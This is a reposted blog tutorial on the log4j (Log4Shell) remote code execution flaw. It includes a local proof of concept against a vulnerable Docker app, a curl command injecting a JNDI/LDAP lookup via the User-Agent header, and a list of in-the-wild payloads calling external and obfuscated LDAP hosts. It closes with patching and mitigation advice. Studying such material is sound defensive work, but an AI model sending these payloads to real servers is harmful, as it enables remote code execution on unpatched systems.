# :globe_with_meridians: Proof of concept: zero-day- log4j RCE

> **Original Source:** [Proof of concept: zero-day- log4j RCE](https://infosecwriteups.com/proof-of-concept-zero-day-log4j-rce-fb9e1364fe92)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Proof of concept: zero-day- log4j RCE


>

What is log4j?


Who are all affected?


Proof of concept:


What just happened above?


Other payloads


Am I at risk?


How can i be secure?


References:


Hello all, Today, we’ll look at how a specially crafted string can lead to remote code execution (RCE), and how this vulnerability affects the majority of the internet. Let’s dive into the topic.

## What is log4j?


Log4j is a logging framework written in java. Developers often use logs to figure out where a problem is occurring in the software. However, this framework has a vulnerability that allows an attacker to do a Remote Code Execution(RCE).

## Who are all affected?


This framework is used by the majority of big tech companies. According to the sources, Minecraft, Apple iCloud, Steam, and a few others were impacted. Many Cybersecurity firms reported that mass scanning for this vulnerability is detected.

## Proof of concept:


If you want to reproduce this vulnerability on your local machine, download this vulnerable app from Github.

Github link: [https://github.com/leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)


## Get Yuvarajan’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Step 1: clone the repository and enter into the directory


Step 2: Use docker to build an image using the following command.


Step 3: Run the docker container like below


Step 4: Open a new terminal and start a Netcat listener


Step 5: Make a curl request

>

curl -H ‘User-Agent: ${jndi:ldap://172.17.0.1:8055/a}’ localhost:1334


Step 6: Now look at the Netcat listener, you will be able to see the received connection.


## What just happened above:


The payload in the curl request triggers the log4j vulnerability in step-5, causing the server to send a request to the attacker’s server. This response contains a path to a remote java class file which is injected into the server process.

## Other payloads:


The following are some of the other payloads that have been caught in the wild.
ldap://2862853fca0b.bingsearchlib.com:39356/a
ldap://45.155.205.233:12344/Basic/Command/Base64/
ldap://x.x.x.x.c6pnncggjk7jk873c9e0cg3zzcoyyyyyn.interactsh.com/999
ldap://x.x.x.x.interactsh.com/a
:ldap://x.x.x.x.interactsh.com/
ldap://friendly-test.cf0bc11b0af516d14673b91478300c4c9e01a08b.dns.cyberwar.nl/friendly-test-no-rce-attempted
${lower:l}${lower:d}a${lower:p}://log4j.bin${upper:a}ryedge.io:80/callback

## Am I at risk:


Versions 2.10 to 2.14 of this framework are vulnerable. If you’re using any of the versions in between, you’re at risk. However, you can also find, if you are vulnerable or not with the help of several tools. I list some of them below.


[https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6](https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6)


[https://twitter.com/thinkstcanary/status/1469439743905697797?s=21](https://twitter.com/thinkstcanary/status/1469439743905697797?s=21)

## How can I be secure:


Patches are already started to roll out. The vulnerability has been resolved in version 2.15, although it still requires Java 8. All of them can’t upgrade to java 8, as it may arise some conflicts in the codebase, so there is some temporary solution suggested by Lunasec. It can be found in the link below.
[https://www.lunasec.io/docs/blog/log4j-zero-day/](https://www.lunasec.io/docs/blog/log4j-zero-day/)

## Final Thoughts:


If you like my work, you can buy me a coffee here


## References:

---

*Originally published on [Medium](https://infosecwriteups.com/proof-of-concept-zero-day-log4j-rce-fb9e1364fe92). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
